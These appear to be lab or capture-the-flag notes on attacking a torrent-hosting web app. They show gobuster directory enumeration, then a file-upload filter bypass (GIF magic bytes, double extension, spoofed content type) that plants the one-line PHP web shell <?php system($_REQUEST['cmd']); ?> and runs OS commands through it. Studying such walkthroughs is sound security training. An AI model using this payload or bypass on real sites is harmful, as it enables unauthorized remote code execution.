```bash
gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u 10.10.10.6
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.6
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/12 12:29:18 Starting gobuster in directory enumeration mode
===============================================================
[TRUNCATED]
/rename               (Status: 301) [Size: 309] [--> http://10.10.10.6/rename/]
/torrent              (Status: 301) [Size: 310] [--> http://10.10.10.6/torrent/]
[TRUNCATED]
```

Doing a directory brute force of the web app reveals 2 new directories: rename and torrent

## /rename/
![[Pasted image 20220412123200.png]]
/rename/ only reveals the API syntax for an index page.

## /torrent/
![[Pasted image 20220412123328.png]]
/torrent/ reveals what appears to be a torrent hosting site.
- The torrent upload functionality itself doesn't appear to be vulnerable -> there are strong controls in place to ensure the uploaded file is indeed a torrent.
- There is functionality to upload screenshots for the torrent which has weaker controls for ensuring appropriate uploaded content.

![[Pasted image 20220412123620.png]]
- Create a php file with a code execution payload. e.g.
	- ```<?php system($_REQUEST['cmd']); ?>```
- Make the follwing changes to the file:
	- Add the magic bytes for a gif
	- Add a gif extension right before the actual extension
	- Change the content-type to image/gif
- The end result would look like this in Burp:
![[Pasted image 20220412131808.png]]

- Navigate to the uploads directory (/torrent/upload) and click on the file with the php extension.
- Manually enter the specified paramter ('cmd' in this example) and enter an os system command value.
- Submit request and observe output of command is returned in the response.
![[Pasted image 20220412132126.png]]
